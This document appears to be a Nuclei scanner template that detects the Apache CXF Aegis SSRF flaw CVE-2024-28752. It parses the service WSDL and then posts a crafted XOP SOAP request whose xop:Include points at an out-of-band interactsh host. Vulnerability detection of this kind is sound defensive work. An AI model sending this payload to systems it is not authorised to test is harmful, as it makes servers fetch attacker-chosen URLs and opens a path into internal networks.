id: CVE-2024-28752

info:
  name: Apache CXF AegisDataBinding SSRF via xop:Include
  author: SeungAh-Hong
  severity: high
  description: |
    A SSRF vulnerability using the Aegis DataBinding in versions of Apache CXF before 4.0.4, 3.6.3 and 3.5.8 allows an attacker to perform SSRF style attacks on webservices that take at least one parameter of any type.
    Users of other data bindings (including the default databinding) are not impacted.
  tags: cve,cve-2024-28752,ssrf,soap,xop,cxf,mtom,oast

http:
  - method: GET
    path:
      - "{{BaseURL}}?wsdl"
    matchers:
      - type: word
        condition: and
        words:
          - "<wsdl:definitions"
          - "targetNamespace="
    extractors:
      - type: regex
        name: tns
        internal: true
        group: 1
        regex:
          - 'targetNamespace="([^"]+)"'
      - type: regex
        name: op
        internal: true
        group: 1
        regex:
          - '<wsdl:operation\s+name="([^"]+)"'
      - type: regex
        name: wrapper
        internal: true
        group: 1
        regex:
          - '<xs:element\s+name="{{op}}"\s+type="tns:([^"]+)"'
      - type: regex
        name: field
        internal: true
        group: 1
        regex:
          - '(?s)<xs:complexType\s+name="{{wrapper}}".*?<xs:element[^>]*name="([^"]+)"'

  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        MIME-Version: 1.0
        Content-Type: multipart/related; boundary="----xopbound"; type="application/xop+xml"; start="<rootpart@cxf>"; start-info="text/xml"

        ------xopbound
        Content-ID: <rootpart@cxf>
        Content-Transfer-Encoding: 8bit
        Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:t="{{tns}}"
                          xmlns:xop="http://www.w3.org/2004/08/xop/include">
          <soapenv:Header/>
          <soapenv:Body>
            <t:{{op}}>
              <arg0>
                <{{field}}><xop:Include href="{{oob-url}}"/></{{field}}>
              </arg0>
            </t:{{op}}>
          </soapenv:Body>
        </soapenv:Envelope>
        ------xopbound--
    attack: pitchfork
    payloads:
      oob-url:
        - "http://{{interactsh-url}}/{{randstr}}"
        - "https://{{interactsh-url}}/{{randstr}}"
    matchers:
      - type: dsl
        dsl:
          - interactsh_protocol == "dns" || interactsh_protocol == "http"
    stop-at-first-match: true
    max-redirects: 0
